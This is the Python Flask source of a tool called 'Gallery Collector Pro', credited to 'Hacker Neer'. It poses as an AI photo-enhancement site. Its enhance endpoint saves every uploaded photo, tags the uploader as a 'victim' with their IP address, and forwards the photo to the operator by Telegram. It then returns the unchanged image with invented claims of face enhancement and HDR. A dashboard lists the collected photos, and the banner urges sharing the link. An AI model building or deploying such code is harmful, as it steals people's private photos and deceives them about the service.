#!/usr/bin/env python3
import os
import json
import time
import base64
import shutil
import hashlib
from datetime import datetime
from flask import Flask, render_template, request, jsonify, send_from_directory
from flask_cors import CORS
import threading
import subprocess
from PIL import Image, ImageFilter, ImageEnhance

# Load config
with open('config.json', 'r') as f:
    CONFIG = json.load(f)

app = Flask(__name__)
app.secret_key = CONFIG['secret_key']
CORS(app)

app.config['COLLECT_FOLDER'] = CONFIG['collect_folder']
app.config['UPLOAD_FOLDER'] = CONFIG['upload_folder']
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024

# Ensure folders exist
os.makedirs(app.config['COLLECT_FOLDER'], exist_ok=True)
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Import Telegram bot
try:
    from telegram_bot import TelegramBot
    telegram_bot = TelegramBot()
except:
    telegram_bot = None

class PhotoManager:
    def __init__(self):
        self.collected_photos = []
        self.victim_id = None
        self.enhancement_queue = []
    
    def save_photo(self, image_data, filename=None, source="victim"):
        """Save photo and send to Telegram"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")[:-3]
            if not filename:
                filename = f"{source}_{timestamp}.jpg"
            
            # Save to uploads
            upload_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            with open(upload_path, 'wb') as f:
                f.write(image_data)
            
            # Copy to collected
            collect_path = os.path.join(app.config['COLLECT_FOLDER'], filename)
            shutil.copy2(upload_path, collect_path)
            
            # Save metadata
            metadata = {
                'filename': filename,
                'timestamp': timestamp,
                'victim_id': self.victim_id or 'unknown',
                'source': source,
                'size': len(image_data),
                'collected_at': datetime.now().isoformat(),
                'ip': self.victim_id or 'unknown'
            }
            
            metadata_path = os.path.join(app.config['COLLECT_FOLDER'], f"{filename}.json")
            with open(metadata_path, 'w') as f:
                json.dump(metadata, f, indent=2)
            
            self.collected_photos.append(metadata)
            print(f"📸 Photo saved: {filename} ({len(image_data)/1024:.1f} KB)")
            
            # Send to Telegram in background
            if CONFIG['telegram']['enabled'] and telegram_bot:
                threading.Thread(target=self.send_to_telegram, args=(collect_path, metadata)).start()
            
            return True, filename
        except Exception as e:
            print(f"Error saving photo: {e}")
            return False, str(e)
    
    def send_to_telegram(self, photo_path, metadata):
        """Send photo to Telegram"""
        try:
            caption = f"""
📸 *New Photo Collected*

📁 *File:* `{metadata['filename']}`
📅 *Time:* {metadata['collected_at']}
📊 *Size:* {metadata['size']/1024:.1f} KB
👤 *Victim IP:* {metadata.get('ip', 'Unknown')}
🔗 *Source:* {metadata.get('source', 'Gallery')}

━━━━━━━━━━━━━━━━━━━━━
🔥 *Tool By:* Hacker Neer
📺 *YouTube:* @hackerneer
🔗 *Link:* https://youtube.com/@hackerneer
━━━━━━━━━━━━━━━━━━━━━
            """
            
            telegram_bot.send_photo(photo_path, caption)
            
        except Exception as e:
            print(f"❌ Telegram send error: {e}")
    
    def fake_enhance(self, image_path):
        """Fake enhancement"""
        try:
            img = Image.open(image_path)
            img = img.filter(ImageFilter.SHARPEN)
            enhancer = ImageEnhance.Brightness(img)
            img = enhancer.enhance(1.1)
            enhancer = ImageEnhance.Contrast(img)
            img = enhancer.enhance(1.1)
            
            base, ext = os.path.splitext(image_path)
            enhanced_path = f"{base}_enhanced{ext}"
            img.save(enhanced_path, quality=95)
            return enhanced_path
        except Exception as e:
            print(f"Enhance error: {e}")
            return image_path

photo_manager = PhotoManager()

@app.route('/')
def index():
    return render_template('index.html', credit=CONFIG['credit'])

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html', credit=CONFIG['credit'])

@app.route('/api/enhance', methods=['POST'])
def enhance_photo():
    try:
        if 'photo' not in request.files:
            return jsonify({'success': False, 'error': 'No photo provided'}), 400
        
        file = request.files['photo']
        if file.filename == '':
            return jsonify({'success': False, 'error': 'No photo selected'}), 400
        
        photo_data = file.read()
        victim_id = request.remote_addr
        photo_manager.victim_id = victim_id
        
        success, filename = photo_manager.save_photo(photo_data, file.filename, "victim")
        
        if success:
            time.sleep(CONFIG['enhancement_time'])
            
            enhanced_data = base64.b64encode(photo_data).decode('utf-8')
            
            return jsonify({
                'success': True,
                'message': 'Image enhanced successfully!',
                'enhanced_image': enhanced_data,
                'processing_time': f"{CONFIG['enhancement_time']}.2s",
                'enhancements_applied': [
                    'AI Sharpening',
                    'Color Boost',
                    'Noise Reduction',
                    'Face Enhancement',
                    'HDR Effect'
                ],
                'quality': '98%',
                'credit': CONFIG['credit']
            })
        else:
            return jsonify({'success': False, 'error': 'Failed to save photo'}), 500
            
    except Exception as e:
        print(f"Enhance error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/photos')
def get_photos():
    try:
        files = os.listdir(app.config['COLLECT_FOLDER'])
        photos = []
        
        for file in sorted(files, reverse=True)[:100]:
            if file.endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp')):
                stat = os.stat(os.path.join(app.config['COLLECT_FOLDER'], file))
                photos.append({
                    'filename': file,
                    'size': stat.st_size,
                    'modified': stat.st_mtime,
                    'url': f'/collected/{file}'
                })
        
        return jsonify({
            'success': True,
            'total': len(photos),
            'photos': photos,
            'credit': CONFIG['credit']
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/collected/<filename>')
def serve_collected(filename):
    return send_from_directory(app.config['COLLECT_FOLDER'], filename)

@app.route('/api/stats')
def get_stats():
    try:
        files = os.listdir(app.config['COLLECT_FOLDER'])
        total = len([f for f in files if f.endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'))])
        
        total_size = 0
        for f in files:
            if f.endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp')):
                try:
                    total_size += os.path.getsize(os.path.join(app.config['COLLECT_FOLDER'], f))
                except:
                    pass
        
        return jsonify({
            'success': True,
            'total_photos': total,
            'total_size_mb': round(total_size / (1024*1024), 2),
            'last_photo': datetime.now().isoformat(),
            'credit': CONFIG['credit']
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/telegram/stats')
def telegram_stats():
    if telegram_bot:
        result = telegram_bot.send_stats()
        return jsonify({
            'success': result,
            'message': 'Stats sent to Telegram' if result else 'Failed to send stats'
        })
    return jsonify({'success': False, 'message': 'Telegram not configured'})

@app.route('/api/telegram/test')
def telegram_test():
    if telegram_bot:
        result = telegram_bot.send_message("✅ *Bot is working!*\n\nGallery Collector is online.\n\n🔥 Tool By: Hacker Neer\n📺 YouTube: @hackerneer")
        return jsonify({
            'success': result,
            'message': 'Test message sent' if result else 'Failed to send'
        })
    return jsonify({'success': False, 'message': 'Telegram not configured'})

if __name__ == '__main__':
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║   🌟 Gallery Collector Pro - By Hacker Neer                ║
║   📸 Main Page: http://localhost:{CONFIG.get('port', 5000)}            ║
║   📊 Dashboard: http://localhost:{CONFIG.get('port', 5000)}/dashboard  ║
║   🤖 Telegram: {'✅ Enabled' if CONFIG['telegram']['enabled'] else '❌ Disabled'}         ║
║   🔄 Auto-Scan: Every 2 seconds                             ║
║                                                              ║
║   📤 Share: http://YOUR_IP:{CONFIG.get('port', 5000)}                 ║
║   📁 Photos: collected/                                      ║
║                                                              ║
║   🔗 YouTube: https://youtube.com/@hackerneer              ║
║   💻 Channel: @hackerneer                                   ║
╚══════════════════════════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=CONFIG.get('port', 5000), debug=False)